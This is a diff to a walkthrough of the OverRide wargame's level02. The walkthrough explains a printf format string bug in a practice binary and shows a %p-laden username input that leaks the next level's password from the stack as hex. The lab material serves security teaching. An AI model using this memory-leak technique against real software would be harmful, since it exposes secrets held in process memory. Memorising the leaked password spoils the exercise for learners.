@@ -56,22 +56,38 @@ int main(int argc, const char **argv, const char **envp)
 ```
 ### Explanation
 
-The binary start by putting the wordpass of 40 characters of the next level into a `buffer` on the stack.
+The program start by putting the wordpass we need into a `buffer` on the stack.
 
 ```c
-fd = fread(buffer, 1, 41, stream);
+  stream = fopen("/home/users/level03/.pass", "r");
+  if ( !stream )
+  {
+    fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
+    exit(1);
+  }
+  fd = fread(buffer, 1, 41, stream);
+  buffer[strcspn(buffer, "\n")] = 0;
 ```
 
-Then, 2 inputs using `fgets()` are taken: a `name` and a `password`.
-Finally a comparison between the `buffer` containing the password is equal to the `name`.
+Next, 2 inputs using `fgets()` are taken: a `name` and a `password`.
+Finally a comparison between the `buffer` containing the password and `name` is done.
 
-The issue results in the fact that if the the comparison listed just above is false, our input `name` will be passed 
-as parameter to `printf()` creating a **printf format string vulnerability* that will enable us to read what's on the stack.
+```c
+  if ( strncmp(buffer, password, 41) )
+  {
+    printf(name);
+    puts(" does not have access!");
+    exit(1);
+  }
+```
+
+The vulnerability occurs when the comparison between the password stored in `buffer` and `name` fails, causing our input `name` to be passed directly to `printf()`, leading to
+a `printf format string` vulnerability  that allows us to read the contents of the stack.
+
+To retrieve the password, we're going to use the `%p` format specifier to print addresses's content in hexadecimal
+and see the wordpass ASCII characters.
 
 ## Step 2: Exploiting the Binary
-
-To achieve it, we're going to use the `%p` format specifier to print addresses's content in hexadecimal
-and see the wordpass ASCII characters of the next level on the stack.
 
 ```bash
 level02@OverRide:~$ ./level02 
@@ -80,13 +96,12 @@ level02@OverRide:~$ ./level02
 | You must login to access this system. |
 ***/
 --[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
---[ Password: 
+--[ Password: a
 *
 0x7fffffffe500(nil)(nil)0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6f80x1f7ff9a08
 (nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)
 0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d0xfeff00 does not have access!
 ```
-
 Here are the 5 bytes containing every characters that constitutes the password to reverse
 because each addresses's content are displayed in little endian.  
 
